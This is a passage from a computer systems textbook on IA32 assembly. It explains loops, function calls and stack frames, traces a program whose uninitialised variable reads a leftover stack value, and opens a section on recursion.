<p class="indent">If the branch is not taken at <span class="literal">&lt;sumUp+38&gt;</span> (i.e., <span class="literal">i</span> is <em>not</em> less than or equal to <span class="literal">n</span>), <span class="literal">total</span> is placed in the return register, and the function exits.</p>&#13;
<p class="indent">The following code listings show the assembly and then the C <span class="literal">goto</span> forms of the <span class="literal">sumUp</span> function:</p>&#13;
<p class="margnote">Assembly</p>&#13;
<p class="programs">&lt;sumUp&gt;:<br/>&#13;
&lt;+0&gt;:   push   %ebp<br/>&#13;
&lt;+1&gt;:   mov    %esp,%ebp<br/>&#13;
&lt;+3&gt;:   sub    $0x10,%esp<br/>&#13;
&lt;+6&gt;:   movl   $0x0,-0x8(%ebp)<br/>&#13;
&lt;+13&gt;:  movl   $0x1,-0x4(%ebp)<br/>&#13;
&lt;+20&gt;:  jmp    &lt;sumUp+32&gt;<br/>&#13;
&lt;+22&gt;:  mov    -0x4(%ebp),%eax<br/>&#13;
&lt;+25&gt;:  add    %eax,-0x8(%ebp)<br/>&#13;
&lt;+28&gt;:  addl   $0x1,-0x4(%ebp)<br/>&#13;
&lt;+32&gt;:  mov    -0x4(%ebp),%eax<br/>&#13;
&lt;+35&gt;:  cmp    0x8(%ebp),%eax<br/>&#13;
&lt;+38&gt;:  jle    &lt;sumUp+22&gt;<br/>&#13;
&lt;+40&gt;:  mov    -0x8(%ebp),%eax<br/>&#13;
&lt;+43&gt;:  leave<br/>&#13;
&lt;+44&gt;:  ret</p>&#13;
<span epub:type="pagebreak" id="page_406"/>&#13;
<p class="margnote">Translated goto form</p>&#13;
<p class="programs">int sumUp(int n) {<br/>&#13;
    int total = 0;<br/>&#13;
    int i = 1;<br/>&#13;
    goto start;<br/>&#13;
body:<br/>&#13;
    total += i;<br/>&#13;
    i += 1;<br/>&#13;
start:<br/>&#13;
    if (i &lt;= n) {<br/>&#13;
        goto body;<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="indent">The preceding code is also equivalent to the following C code without <span class="literal">goto</span> statements:</p>&#13;
<p class="programs">int sumUp(int n) {<br/>&#13;
    int total = 0;<br/>&#13;
    int i = 1;<br/>&#13;
    while (i &lt;= n) {<br/>&#13;
        total += i;<br/>&#13;
        i += 1;<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<h5 class="h5" id="lev3_69">for Loops in Assembly</h5>&#13;
<p class="noindent">The primary loop in the <span class="literal">sumUp</span> function can also be written as a <span class="literal">for</span> loop:</p>&#13;
<p class="programs">int sumUp2(int n) {<br/>&#13;
    int total = 0;             //initialize total to 0<br/>&#13;
    int i;<br/>&#13;
    for (i = 1; i &lt;= n; i++) { //initialize i to 1, increment by 1 while i&lt;=n<br/>&#13;
        total += i;            //updates total by i<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="indent">This version yields assembly code identical to our <span class="literal">while</span> loop example. We repeat the assembly code here and annotate each line with its English translation:</p>&#13;
<p class="programs">0x8048438 &lt;+0&gt;:  push   %ebp                  # save ebp<br/>&#13;
0x8048439 &lt;+1&gt;:  mov    %esp,%ebp             # update ebp (new stack frame)<br/>&#13;
0x804843b &lt;+3&gt;:  sub    $0x10,%esp            # add 16 bytes to stack frame<br/>&#13;
0x804843e &lt;+6&gt;:  movl   $0x0,-0x8(%ebp)       # place 0 at ebp-0x8 (total)<br/>&#13;
<span epub:type="pagebreak" id="page_407"/>&#13;
0x8048445 &lt;+13&gt;: movl   $0x1,-0x4(%ebp)       # place 1 at ebp-0x4 (i)<br/>&#13;
0x804844c &lt;+20&gt;: jmp    0x8048458 &lt;sumUp2+32&gt; # goto &lt;sumUp2+32&gt;<br/>&#13;
0x804844e &lt;+22&gt;: mov    -0x4(%ebp),%eax       # copy i to %eax<br/>&#13;
0x8048451 &lt;+25&gt;: add    %eax,-0x8(%ebp)       # add %eax to total (total+=i)<br/>&#13;
0x8048454 &lt;+28&gt;: addl   $0x1,-0x4(%ebp)       # add 1 to i (i+=1)<br/>&#13;
0x8048458 &lt;+32&gt;: mov    -0x4(%ebp),%eax       # copy i to %eax<br/>&#13;
0x804845b &lt;+35&gt;: cmp    0x8(%ebp),%eax        # compare i with n<br/>&#13;
0x804845e &lt;+38&gt;: jle    0x804844e &lt;sumUp2+22&gt; # if (i &lt;= n) goto &lt;sumUp2+22&gt;<br/>&#13;
0x8048460 &lt;+40&gt;: mov    -0x8(%ebp),%eax       # copy total to %eax<br/>&#13;
0x8048463 &lt;+43&gt;: leave                        # prepare to leave the function<br/>&#13;
0x8048464 &lt;+44&gt;: ret                          # return total</p>&#13;
<p class="indent">To understand why the <span class="literal">for</span> loop version of this code results in identical assembly to the <span class="literal">while</span> loop version of the code, recall that the <span class="literal">for</span> loop has the following representation</p>&#13;
<p class="programs">for ( &lt;<span class="codeitalic1">initialization</span>&gt;; &lt;<span class="codeitalic1">boolean expression</span>&gt;; &lt;<span class="codeitalic1">step</span>&gt; ){<br/>&#13;
    &lt;<span class="codeitalic1">body</span>&gt;<br/>&#13;
}</p>&#13;
<p class="noindent">and is equivalent to the following <span class="literal">while</span> loop representation:</p>&#13;
<p class="programs"><span class="codeitalic1">&lt;initialization&gt;</span><br/>&#13;
while (<span class="codeitalic1">&lt;boolean expression&gt;</span>) {<br/>&#13;
    <span class="codeitalic1">&lt;body&gt;</span><br/>&#13;
    <span class="codeitalic1">&lt;step&gt;</span><br/>&#13;
}</p>&#13;
<p class="indent">Since every <span class="literal">for</span> loop can be represented by a <span class="literal">while</span> loop (see “for Loops” on <a href="ch01.xhtml#lev3_5">page 35</a>), the following two C programs are equivalent representations for the previous assembly:</p>&#13;
<p class="margnote">for loop</p>&#13;
<p class="programs">int sumUp2(int n) {<br/>&#13;
    int total = 0;<br/>&#13;
    int i = 1;<br/>&#13;
    for (i; i &lt;= n; i++) {<br/>&#13;
        total += i;<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="margnote">while loop</p>&#13;
<p class="programs">int sumUp(int n){<br/>&#13;
    int total = 0;<br/>&#13;
    int i = 1;<br/>&#13;
    while (i &lt;= n) {<br/>&#13;
        total += i;<br/>&#13;
        i += 1;<br/>&#13;
<span epub:type="pagebreak" id="page_408"/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<h3 class="h3" id="lev1_66">8.5 Functions in Assembly</h3>&#13;
<p class="noindent">In the previous section, we traced through simple functions in assembly. In this section, we discuss the interaction between multiple functions in assembly in the context of a larger program. We also introduce some new instructions involved with function management.</p>&#13;
<p class="indent">Let’s begin with a refresher on how the call stack is managed. Recall that <span class="literal">%esp</span> is the <em>stack pointer</em> and always points to the top of the stack. The register <span class="literal">%ebp</span> represents the base pointer (also known as the <em>frame pointer</em>) and points to the base of the current stack frame. The <em>stack frame</em> (also known as the <em>activation frame</em> or the <em>activation record</em>) refers to the portion of the stack allocated to a single function call. The currently executing function is always at the top of the stack, and its stack frame is referred to as the <em>active frame</em>. The active frame is bounded by the stack pointer (at the top of stack) and the frame pointer (at the bottom of the frame). The activation record typically holds local variables and parameters for a function.</p>&#13;
<p class="indent"><a href="ch08.xhtml#ch8fig3">Figure 8-3</a> shows the stack frames for <span class="literal">main</span> and a function it calls named <span class="literal">fname</span>. We will refer to the <span class="literal">main</span> function as the <em>caller</em> function and <span class="literal">fname</span> as the <em>callee</em> function.</p>&#13;
<div class="imagec" id="ch8fig3"><img alt="image" src="../images/08fig03.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-3: Stack frame management</em></p>&#13;
<p class="indent">In <a href="ch08.xhtml#ch8fig3">Figure 8-3</a>, the current active frame belongs to the callee function (<span class="literal">fname</span>). The memory between the stack pointer and the frame pointer is used for local variables. The stack pointer moves as local values are pushed and popped from the stack. In contrast, the frame pointer remains relatively constant, pointing to the beginning (the bottom) of the current stack frame. As a result, compilers like GCC commonly reference values on the stack relative to the frame pointer. In <a href="ch08.xhtml#ch8fig3">Figure 8-3</a>, the active frame is bounded below by the base pointer of <span class="literal">fname</span>, which contains the stack address 0x418. The value stored at this address is the “saved” <span class="literal">%ebp</span> value (0x42c), which itself indicates <span epub:type="pagebreak" id="page_409"/>the bottom of the activation frame for the <span class="literal">main</span> function. The top of the activation frame of <span class="literal">main</span> is bounded by the <em>return address</em>, which indicates the program address at which <span class="literal">main</span> resumes execution as soon as the callee function finishes executing.</p>&#13;
<p class="note"><strong><span class="black">Warning</span> THE RETURN ADDRESS POINTS TO PROGRAM MEMORY, NOT STACK MEMORY</strong></p>&#13;
<p class="note-w">Recall that the call stack region (stack memory) of a program is different from its code region (code memory). Whereas <span class="literal">%ebp</span> and <span class="literal">%esp</span> point to locations in the stack memory, <span class="literal">%eip</span> points to a location in <em>code</em> memory. In other words, the return address is an address in code memory, not stack memory (see <a href="ch08.xhtml#ch8fig4">Figure 8-4</a>).</p>&#13;
<div class="imagec" id="ch8fig4"><img alt="image" src="../images/08fig04.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-4: The parts of a program’s address space</em></p>&#13;
<p class="indent"><a href="ch08.xhtml#ch8tab16">Table 8-16</a> contains several additional instructions that the compiler uses for basic function management.</p>&#13;
<p class="tabcap" id="ch8tab16"><strong>Table 8-16:</strong> Common Function Management Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:80%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Instruction</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Translation</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">leave</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Prepares the stack for leaving a function. Equivalent to:</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">mov %ebp,%esp</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">pop %ebp</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">call addr &lt;fname&gt;</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Switches active frame to callee function. Equivalent to:</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">push %eip</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">mov addr,%eip</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">ret</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">Restores active frame to caller function. Equivalent to:</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">pop %eip</span></p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_410"/>For example, the <span class="literal">leave</span> instruction is a shorthand that the compiler uses to restore the stack and frame pointers as it prepares to leave a function. When the callee function finishes execution, <span class="literal">leave</span> ensures that the frame pointer is <em>restored</em> to its previous value.</p>&#13;
<p class="indent">The <span class="literal">call</span> and <span class="literal">ret</span> instructions play a prominent role in the process where one function calls another. Both instructions modify the instruction pointer (register <span class="literal">%eip</span>). When the caller function executes the <span class="literal">call</span> instruction, the current value of <span class="literal">%eip</span> is saved on the stack to represent the return address, or the program address at which the caller resumes executing once the callee function finishes. The <span class="literal">call</span> instruction also replaces the value of <span class="literal">%eip</span> with the address of the callee function.</p>&#13;
<p class="indent">The <span class="literal">ret</span> instruction restores the value of <span class="literal">%eip</span> to the value saved on the stack, ensuring that the program resumes execution at the program address specified in the caller function. Any value returned by the callee is stored in <span class="literal">%eax</span>. The <span class="literal">ret</span> instruction is usually the last instruction that executes in any function.</p>&#13;
<h4 class="h4" id="lev2_151">8.5.1 Tracing Through an Example</h4>&#13;
<p class="noindent">Using our knowledge of function management, let’s trace through the code example first introduced at the beginning of this chapter.</p>&#13;
<p class="programs">#include &lt;stdio.h&gt;<br/>&#13;
<br/>&#13;
int assign(){<br/>&#13;
    int y = 40;<br/>&#13;
    return y;<br/>&#13;
}<br/>&#13;
<br/>&#13;
int adder(){<br/>&#13;
    int a;<br/>&#13;
    return a + 2;<br/>&#13;
}<br/>&#13;
<br/>&#13;
int main(){<br/>&#13;
    int x;<br/>&#13;
    assign();<br/>&#13;
    x = adder();<br/>&#13;
    printf("x is: %d\n", x);<br/>&#13;
    return 0;<br/>&#13;
}</p>&#13;
<p class="indent">We compile the code with the <span class="literal">-m32</span> flag and use <span class="literal">objdump -d</span> to view the underlying assembly. The latter command outputs a pretty big file that contains a lot of information that we don’t need. Use <span class="literal">less</span> and the search functionality to extract the <span class="literal">adder</span>, <span class="literal">assign</span>, and <span class="literal">main</span> functions:</p>&#13;
<span epub:type="pagebreak" id="page_411"/>&#13;
<p class="programs">804840d &lt;assign&gt;:<br/>&#13;
 804840d:       55                      push   %ebp<br/>&#13;
 804840e:       89 e5                   mov    %esp,%ebp<br/>&#13;
 8048410:       83 ec 10                sub    $0x10,%esp<br/>&#13;
 8048413:       c7 45 fc 28 00 00 00    movl   $0x28,-0x4(%ebp)<br/>&#13;
 804841a:       8b 45 fc                mov    -0x4(%ebp),%eax<br/>&#13;
 804841d:       c9                      leave<br/>&#13;
 804841e:       c3                      ret<br/>&#13;
<br/>&#13;
0804841f &lt;adder&gt;:<br/>&#13;
 804841f:       55                      push   %ebp<br/>&#13;
 8048420:       89 e5                   mov    %esp,%ebp<br/>&#13;
 8048422:       83 ec 10                sub    $0x10,%esp<br/>&#13;
 8048425:       8b 45 fc                mov    -0x4(%ebp),%eax<br/>&#13;
 8048428:       83 c0 02                add    $0x2,%eax<br/>&#13;
 804842b:       c9                      leave<br/>&#13;
 804842c:       c3                      ret<br/>&#13;
<br/>&#13;
0804842d &lt;main&gt;:<br/>&#13;
 804842d:       55                      push   %ebp<br/>&#13;
 804842e:       89 e5                   mov    %esp,%ebp<br/>&#13;
 8048433:       83 ec 20                sub    $0x14,%esp<br/>&#13;
 8048436:       e8 d2 ff ff ff          call   804840d &lt;assign&gt;<br/>&#13;
 804843b:       e8 df ff ff ff          call   804841f &lt;adder&gt;<br/>&#13;
 8048440:       89 44 24 1c             mov    %eax,0xc(%esp)<br/>&#13;
 8048444:       8b 44 24 1c             mov    0xc(%esp),%eax<br/>&#13;
 8048448:       89 44 24 04             mov    %eax,0x4(%esp)<br/>&#13;
 804844c:       c7 04 24 f4 84 04 08    movl   $0x80484f4,(%esp)<br/>&#13;
 8048453:       e8 88 fe ff ff          call   80482e0 &lt;printf@plt&gt;<br/>&#13;
 8048458:       b8 00 00 00 00          mov    $0x0,%eax<br/>&#13;
 804845d:       c9                      leave<br/>&#13;
 804845e:       c3                      ret</p>&#13;
<p class="indent">Each function begins with a symbolic label that corresponds to its declared name in the program. For example, <span class="literal">&lt;main&gt;:</span> is the symbolic label for the <span class="literal">main</span> function. The address of a function label is also the address of the first instruction in that function. To save space in the figures that follow, we truncate addresses to the lower 12 bits. So, program address 0x804842d is shown as 0x42d.</p>&#13;
<h4 class="h4" id="lev2_152">8.5.2 Tracing Through main</h4>&#13;
<p class="noindent"><a href="ch08.xhtml#ch8fig5">Figure 8-5</a> shows the execution stack immediately prior to the execution of <span class="literal">main</span>.</p>&#13;
<div class="imagec" id="ch8fig5"><span epub:type="pagebreak" id="page_412"/><img alt="image" src="../images/08fig05.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-5: The initial state of the CPU registers and call stack prior to executing the main function</em></p>&#13;
<p class="indent">Recall that the stack grows toward lower addresses. In this example, <span class="literal">%ebp</span> is address 0x140, and <span class="literal">%esp</span> is address 0x130 (both of these values are made up for this example). Registers <span class="literal">%eax</span> and <span class="literal">%edx</span> initially contain junk values. The upper-left arrow indicates the currently executing instruction. Initially, <span class="literal">%eip</span> contains address 0x42d, which is the program memory address of the first line in the <span class="literal">main</span> function. Let’s trace through the program’s execution together.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0412-01.jpg"/></div>&#13;
<p class="indent">The first instruction pushes the value of <span class="literal">ebp</span> onto the stack, saving address 0x140. Since the stack grows toward lower addresses, the stack pointer <span class="literal">%esp</span> updates to 0x12c, which is four bytes less than 0x130. Register <span class="literal">%eip</span> advances to the next instruction in sequence.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_413"/><img alt="image" src="../images/f0413-01.jpg"/></div>&#13;
<p class="indent">The next instruction (<span class="literal">mov %esp,%ebp</span>) updates the value of <span class="literal">%ebp</span> to be the same as <span class="literal">%esp</span>. The frame pointer (<span class="literal">%ebp</span>) now points to the start of the stack frame for the <span class="literal">main</span> function. <span class="literal">%eip</span> advances to the next instruction in sequence.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0413-02.jpg"/></div>&#13;
<p class="indent">The <span class="literal">sub</span> instruction subtracts 0x14 from the address of our stack pointer, “growing” the stack by 20 bytes. Register <span class="literal">%eip</span> advances to the next instruction, which is the first <span class="literal">call</span> instruction.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_414"/><img alt="image" src="../images/f0414-01.jpg"/></div>&#13;
<p class="indent">The <span class="literal">call &lt;assign&gt;</span> instruction pushes the value inside register <span class="literal">%eip</span> (which denotes the address of the <em>next</em> instruction to execute) onto the stack. Since the next instruction after <span class="literal">call &lt;assign&gt;</span> has the address 0x43b, that value is pushed onto the stack as the return address. Recall that the return address indicates the program address where execution should resume when program execution returns to <span class="literal">main</span>.</p>&#13;
<p class="indent">Next, the <span class="literal">call</span> instruction moves the address of the <span class="literal">assign</span> function (0x40d) into register <span class="literal">%eip</span>, signifying that program execution should continue into the callee function <span class="literal">assign</span> and not the next instruction in <span class="literal">main</span>.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_415"/><img alt="image" src="../images/f0415-01.jpg"/></div>&#13;
<p class="indent">The first two instructions that execute in the <span class="literal">assign</span> function are the usual book-keeping that every function performs. The first instruction pushes the value stored in <span class="literal">%ebp</span> (memory address 0x12c) onto the stack. Recall that this address points to the beginning of the stack frame for <span class="literal">main</span>. <span class="literal">%eip</span> advances to the second instruction in <span class="literal">assign</span>.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_416"/><img alt="image" src="../images/f0416-01.jpg"/></div>&#13;
<p class="indent">The next instruction (<span class="literal">mov %esp,%ebp</span>) updates <span class="literal">%ebp</span> to point to the top of the stack, marking the beginning of the stack frame for <span class="literal">assign</span>. The instruction pointer (<span class="literal">%eip</span>) advances to the next instruction in the <span class="literal">assign</span> function.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0416-02.jpg"/></div>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_417"/>The <span class="literal">sub</span> instruction at address 0x410 grows the stack by 16 bytes, creating extra space on the stack frame to store local values and updating <span class="literal">%esp</span>. The instruction pointer again advances to the next instruction in the <span class="literal">assign</span> function.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0417-01.jpg"/></div>&#13;
<p class="indent">The <span class="literal">mov</span> instruction at address 0x413 moves the value <span class="literal">$0x28</span> (or 40) onto the stack at address <span class="literal">-0x4(%ebp)</span>, which is four bytes above the frame pointer. Recall that the frame pointer is commonly used to reference locations on the stack. <span class="literal">%eip</span> advances to the next instruction in the <span class="literal">assign</span> function.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_418"/><img alt="image" src="../images/f0418-01.jpg"/></div>&#13;
<p class="indent">The <span class="literal">mov</span> instruction at address 0x41a places the value <span class="literal">$0x28</span> into register <span class="literal">%eax</span>, which holds the return value of the function. <span class="literal">%eip</span> advances to the <span class="literal">leave</span> instruction in the <span class="literal">assign</span> function.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_419"/><img alt="image" src="../images/f0419-01.jpg"/></div>&#13;
<p class="indent">At this point, the <span class="literal">assign</span> function has almost completed execution. The next instruction that executes is the <span class="literal">leave</span> instruction, which prepares the stack for returning from the function call. Recall that <span class="literal">leave</span> is analogous to the following pair of instructions:</p>&#13;
<p class="programs">mov %ebp, %esp<br/>&#13;
pop %ebp</p>&#13;
<p class="indent">In other words, the CPU overwrites the stack pointer with the frame pointer. In our example, the stack pointer is initially updated from 0x100 to 0x110. Next, the CPU executes <span class="literal">pop %ebp</span>, which takes the value located at 0x110 (in our example, the address 0x12c) and places it in <span class="literal">%ebp</span>. Recall that 0x12c is the start of the stack frame for <span class="literal">main</span>. <span class="literal">%esp</span> becomes 0x114, and <span class="literal">%eip</span> points to the <span class="literal">ret</span> instruction in the <span class="literal">assign</span> function.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_420"/><img alt="image" src="../images/f0420-01.jpg"/></div>&#13;
<p class="indent">The last instruction in <span class="literal">assign</span> is a <span class="literal">ret</span> instruction. When <span class="literal">ret</span> executes, the return address is popped off the stack into register <span class="literal">%eip</span>. In our example, <span class="literal">%eip</span> now advances to the call to the <span class="literal">adder</span> function.</p>&#13;
<p class="indent">Some important things to notice at this juncture:</p>&#13;
<ul>&#13;
<li class="noindent">The stack pointer and frame pointer have been restored to their values prior to the call to <span class="literal">assign</span>, reflecting that the stack frame for <span class="literal">main</span> is again the active frame.</li>&#13;
<li class="noindent">The old values on the stack from the prior active stack frame are <em>not</em> removed. They still exist on the call stack.</li>&#13;
</ul>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_421"/><img alt="image" src="../images/f0421-01.jpg"/></div>&#13;
<p class="indent">The call to <span class="literal">adder</span> <em>overwrites</em> the old return address on the stack with a new return address (0x440). This return address points to the next instruction to be executed after <span class="literal">adder</span> returns, or <span class="literal">mov %eax,0xc(%ebp)</span>. <span class="literal">%eip</span> reflects the first instruction to execute in <span class="literal">adder</span>, which is at address 0x41f.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_422"/><img alt="image" src="../images/f0422-01.jpg"/></div>&#13;
<p class="indent">The first instruction in the <span class="literal">adder</span> function saves the caller’s frame pointer (<span class="literal">%ebp</span> of <span class="literal">main</span>) on the stack.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0422-02.jpg"/></div>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_423"/>The next instruction updates <span class="literal">%ebp</span> with the current value of <span class="literal">%esp</span>, or address 0x110. Together, these last two instructions establish the beginning of the stack frame for <span class="literal">adder</span>.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0423-01.jpg"/></div>&#13;
<p class="indent">The <span class="literal">sub</span> instruction at address 0x422 “grows” the stack by 16 bytes. Notice again that growing the stack does not affect any previously created values on the stack. Again, old values will litter the stack until they are overwritten.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_424"/><img alt="image" src="../images/f0424-01.jpg"/></div>&#13;
<p class="indent">Pay close attention to the next instruction that executes: <span class="literal">mov $-0x4(%ebp),</span> <span class="literal">%eax</span>. This moves an <em>old</em> value that is on the stack into register <span class="literal">%eax</span>! This is a direct result of the fact that the programmer forgot to initialize <span class="literal">a</span> in the function <span class="literal">adder</span>.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0425-01.jpg"/></div>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_425"/>The <span class="literal">add</span> instruction at address 0x428 adds 2 to register <span class="literal">%eax</span>. Recall that IA32 passes the return value through register <span class="literal">%eax</span>. Together, the last two instructions are equivalent to the following code in <span class="literal">adder</span>:</p>&#13;
<p class="programs">int a;<br/>&#13;
return a + 2;</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_426"/><img alt="image" src="../images/f0426-01.jpg"/></div>&#13;
<p class="indent">After <span class="literal">leave</span> executes, the frame pointer again points to the beginning of the stack frame for <span class="literal">main</span>, or address 0x12c. The stack pointer now stores the address 0x114.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_427"/><img alt="image" src="../images/f0427-01.jpg"/></div>&#13;
<p class="indent">The execution of <span class="literal">ret</span> pops the return address off the stack, restoring the instruction pointer back to 0x440, or the address of the next instruction to execute in <span class="literal">main</span>. The address of <span class="literal">%esp</span> is now 0x118.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_428"/><img alt="image" src="../images/f0428-01.jpg"/></div>&#13;
<p class="indent">The <span class="literal">mov %eax,0xc(%esp)</span> instruction places the value in <span class="literal">%eax</span> in a location 12 bytes (three spaces) below <span class="literal">%esp</span>.</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0428-02.jpg"/></div>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_429"/>Skipping ahead a little, the <span class="literal">mov</span> instructions at addresses 0x444 and 0x448 set <span class="literal">%eax</span> to the value saved at location <span class="literal">%esp+12</span> (or 0x2A) and places 0x2A one spot below the top of the stack (address <span class="literal">%esp + 4</span>, or 0x11c).</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0429-01.jpg"/></div>&#13;
<p class="indent">The next instruction (<span class="literal">mov $0x80484f4, (%esp)</span>) copies a constant value that is a memory address to the top of the stack. This particular memory address, 0x80484f4, contains the string <span class="literal">"x is %d\n"</span>. The instruction pointer advances to the call to the <span class="literal">printf</span> function (which is denoted with the label <span class="literal">&lt;printf@plt&gt;</span>).</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_430"/><img alt="image" src="../images/f0430-01.jpg"/></div>&#13;
<p class="indent">For the sake of brevity, we will not trace the <span class="literal">printf</span> function, which is part of <span class="literal">stdio.h</span>. However, we know from the manual page (<span class="literal">man -s3 printf</span>) that <span class="literal">printf</span> has the following format:</p>&#13;
<p class="programs">int printf(const char * format, ...)</p>&#13;
<p class="indent">In other words, the first argument is a pointer to a string specifying the format, and the second argument onward specify the values that are used in that format. The instructions specified by addresses 0x444–0x45c correspond to the following line in the <span class="literal">main</span> function:</p>&#13;
<p class="programs">printf("x is %d\n", x);</p>&#13;
<p class="indent">When the <span class="literal">printf</span> function is called:</p>&#13;
<ul>&#13;
<li class="noindent">A return address specifying the instruction that executes after the call to <span class="literal">printf</span> is pushed onto the stack.</li>&#13;
<li class="noindent">The value of <span class="literal">%ebp</span> is pushed onto the stack, and <span class="literal">%ebp</span> is updated to point to the top of the stack, indicating the beginning of the stack frame for <span class="literal">printf</span>.</li>&#13;
</ul>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_431"/>At some point, <span class="literal">printf</span> references its arguments, which are the string <span class="literal">"x is %d\n"</span> and the value 0x2A. Recall that the return address is located directly below <span class="literal">%ebp</span> at location <span class="literal">%ebp</span> + 4. The first argument is thus located at <span class="literal">%ebp</span> + 8 (i.e., directly <em>below</em> the return address), and the second argument is located at <span class="literal">%ebp</span> + 12.</p>&#13;
<p class="indent">For any function with <em>n</em> arguments, GCC places the first argument at location <span class="literal">%ebp</span> + 8, the second at <span class="literal">%ebp</span> + 12, and the <em>n</em>th argument at location (<span class="literal">%ebp</span> + 8) + (4 × (<em>n –</em> 1)).</p>&#13;
<p class="indent">After the call to <span class="literal">printf</span>, the value 0x2A is output to the user in integer format. Thus, the value 42 is printed to the screen!</p>&#13;
<div class="imagec"><img alt="image" src="../images/f0431-01.jpg"/></div>&#13;
<p class="indent">After the call to <span class="literal">printf</span>, the last few instructions clean up the stack and prepare a clean exit from the <span class="literal">main</span> function. First, the value 0x0 is placed in register <span class="literal">%eax</span>, signifying that the value 0 is returned from <span class="literal">main</span>. Recall that a program returns 0 to indicate correct termination.</p>&#13;
<div class="imagec"><span epub:type="pagebreak" id="page_432"/><img alt="image" src="../images/f0432-01.jpg"/></div>&#13;
<p class="indent">After <span class="literal">leave</span> and <span class="literal">ret</span> are executed, the stack and frame pointers revert to their original values prior to the execution of <span class="literal">main</span>. With 0x0 in the return register <span class="literal">%eax</span>, the program returns 0.</p>&#13;
<p class="indent">If you have carefully read through this section, you should understand why our program prints out the value 42. In essence, the program inadvertently uses old values on the stack to cause it to behave in a way that we didn’t expect. While this example was pretty harmless, we discuss in future sections how hackers have misused function calls to make programs misbehave in truly malicious ways.</p>&#13;
<h3 class="h3" id="lev1_67">8.6 Recursion</h3>&#13;
<p class="noindent">Recursive functions are a special class of functions that call themselves (also known as <em>self-referential</em> functions) to compute a value. Like their nonrecursive counterparts, recursive functions create new stack frames for each function call. Unlike standard functions, recursive functions contain function calls to themselves.</p>&#13;
<p class="indent">Let’s revisit the problem of summing up the set of positive integers from 1 to <em>n</em>. In previous sections, we discussed the <span class="literal">sumUp</span> function to achieve this task. The following code shows a related function called <span class="literal">sumDown</span>, which adds the numbers in reverse (<em>n</em> to 1), and its recursive equivalent <span class="literal">sumr</span>:</p>&#13;
<p class="margnote">Iterative</p>&#13;
<p class="programs">int sumDown(int n) {<br/>&#13;
    int total = 0;<br/>&#13;
    int i = n;<br/>&#13;
    while (i &gt; 0) {<br/>&#13;
        total += i;<br/>&#13;
        i--;<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="margnote">Recursive</p>&#13;
<p class="programs">int sumr(int n) {<br/>&#13;
    if (n &lt;= 0) {<br/>&#13;
        return 0;<br/>&#13;
    }<br/>&#13;
    return n + sumr(n-1);<br/>&#13;
}</p>&#13;
